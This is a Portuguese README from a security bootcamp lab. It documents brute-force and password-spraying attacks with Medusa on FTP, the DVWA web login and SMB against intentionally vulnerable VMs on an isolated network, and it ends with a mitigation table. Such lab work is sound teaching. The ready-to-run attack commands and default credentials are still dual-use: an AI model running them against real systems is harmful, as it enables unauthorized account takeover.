# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Projeto prático do Bootcamp Santander — Cibersegurança do Zero à Prática (DIO), com o objetivo de simular, documentar e compartilhar ataques de força bruta em um ambiente controlado, utilizando **Kali Linux** e **Medusa** contra máquinas intencionalmente vulneráveis (**Metasploitable2** e **DVWA**).

> ⚠️ **Aviso ético e legal:** todos os testes aqui documentados foram realizados exclusivamente em máquinas virtuais isoladas (rede host-only), criadas especificamente para fins educacionais. Nunca execute essas técnicas contra sistemas ou redes sem autorização explícita — isso é crime previsto na Lei 12.737/2012 (Lei Carolina Dieckmann) e no Marco Civil da Internet.

---

## 📋 Descrição do Desafio

Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (Metasploitable2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

## 🎯 Objetivos de Aprendizagem

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- Utilizar Kali Linux e Medusa para auditoria de segurança em ambiente controlado
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- Utilizar o GitHub como portfólio técnico

---

## 🧪 Ambiente de Testes

| Máquina | Função | Sistema | IP (exemplo) |
|---|---|---|---|
| VM 1 | Atacante | Kali Linux | 192.168.56.10 |
| VM 2 | Alvo | Metasploitable2 (com DVWA) | 192.168.56.20 |

- **Hipervisor:** VirtualBox
- **Rede:** Adaptador *Host-only* (isolada, sem acesso à internet/rede externa)
- **Ferramentas:** Medusa, Nmap, Hydra (comparação), smbclient, DVWA

### Como montar o ambiente

1. Baixar e importar as imagens do **Kali Linux** e do **Metasploitable2** no VirtualBox.
2. Criar uma rede **Host-only** (`Arquivo > Gerenciador de Rede Host-only`) e configurá-la nas duas VMs.
3. Subir as duas VMs e verificar a conectividade com `ping` entre elas.
4. No Metasploitable2, confirmar que o DVWA está acessível em `http://<IP_ALVO>/dvwa` (login padrão `admin` / `password`, com nível de segurança ajustado para *low* nos testes iniciais).
5. No Kali, confirmar que `medusa`, `nmap` e `hydra` estão instalados (`sudo apt install medusa hydra nmap`).

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Finalidade |
|---|---|
| **Nmap** | Varredura de portas e enumeração de serviços |
| **Medusa** | Ferramenta principal de força bruta (FTP, HTTP form, SMB) |
| **Hydra** | Usado em um cenário para comparação de desempenho/sintaxe |
| **smbclient** | Enumeração manual de compartilhamentos SMB |
| **DVWA** | Aplicação web intencionalmente vulnerável, alvo do ataque ao formulário de login |

---

## 📁 Estrutura do Repositório

```
.
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   └── senhas.txt
├── scripts/
│   └── comandos_laboratorio.sh
└── images/
    ├── 01-nmap-scan.png
    ├── 02-ftp-bruteforce.png
    ├── 03-dvwa-form.png
    └── 04-smb-enum.png
```

> As imagens em `/images` devem ser suas próprias capturas de tela, feitas durante a execução de cada etapa.

---

## 📝 Wordlists Criadas

- **`wordlists/usuarios.txt`** — nomes de usuário comuns/padrão (admin, root, msfadmin, guest, etc.)
- **`wordlists/senhas.txt`** — senhas fracas e previsíveis (123456, password, admin, qwerty, etc.)

Essas listas simulam o comportamento real de atacantes que exploram **credenciais padrão não alteradas** e **senhas fracas**, um dos vetores de invasão mais comuns em ambientes reais.

---

## 🎯 Cenários de Ataque Simulados

### 1️⃣ Força bruta em FTP

Reconhecimento do serviço com Nmap:
```bash
nmap -sV -p 21 192.168.56.20
```

Ataque com Medusa:
```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4
```

- `-h` → host alvo
- `-U` / `-P` → listas de usuários e senhas
- `-M` → módulo (protocolo) a atacar
- `-t` → número de threads paralelas

**Resultado esperado:** o Medusa retorna `ACCOUNT FOUND` quando encontra uma combinação válida (no Metasploitable2 padrão, `msfadmin:msfadmin` costuma funcionar).

### 2️⃣ Ataque em formulário web de login (DVWA)

Primeiro inspeciona-se o HTML do formulário (via *DevTools* do navegador) para identificar os nomes dos campos (`username`, `password`) e a mensagem exibida em caso de falha (`Login failed`).

```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas.txt \
  -M http -m DIR:/dvwa/login.php \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

- `^USER^` e `^PASS^` são substituídos automaticamente pelas combinações testadas
- `F=` define a *string* que identifica uma tentativa falha, para o Medusa distinguir sucesso de erro

### 3️⃣ SMB — Enumeração de usuários + Password Spraying

Enumeração de usuários e compartilhamentos:
```bash
nmap --script smb-enum-users -p 445 192.168.56.20
smbclient -L //192.168.56.20/ -N
```

Password spraying (uma senha comum testada contra vários usuários — reduz o risco de bloqueio de conta em comparação com força bruta tradicional):
```bash
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -p "senha123" -M smbnt
```

---

## ✅ Validação dos Acessos

Após encontrar credenciais válidas em cada cenário, o acesso foi validado manualmente:
- **FTP:** `ftp 192.168.56.20` + login com a credencial encontrada
- **DVWA:** login no navegador com a combinação identificada
- **SMB:** `smbclient //192.168.56.20/<share> -U <usuario>`

---

## 🛡️ Recomendações de Mitigação

| Vulnerabilidade explorada | Recomendação |
|---|---|
| Senhas padrão/fracas | Política de senhas fortes + troca obrigatória no primeiro acesso |
| Ausência de bloqueio de conta | Implementar *account lockout* após N tentativas falhas |
| Ausência de MFA | Habilitar autenticação multifator em serviços críticos |
| Serviços FTP/SMB expostos | Restringir acesso por firewall/VLAN, desativar serviços não essenciais |
| Formulário web sem proteção | Implementar CAPTCHA, *rate limiting* e detecção de automação (WAF) |
| Falta de monitoramento | Centralizar logs de autenticação e alertar múltiplas falhas (SIEM) |

---

## 📚 Recursos Úteis

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Medusa – Documentação](https://github.com/jmk-foofus/medusa)
- [Nmap – Manual Oficial](https://nmap.org/book/man.html)

---

## 🙋 Autor

Ismael Souza — Gestor em Tecnologia da Informação (IEPTEC), projeto desenvolvido como parte do Bootcamp Santander — Cibersegurança do Zero à Prática (DIO).
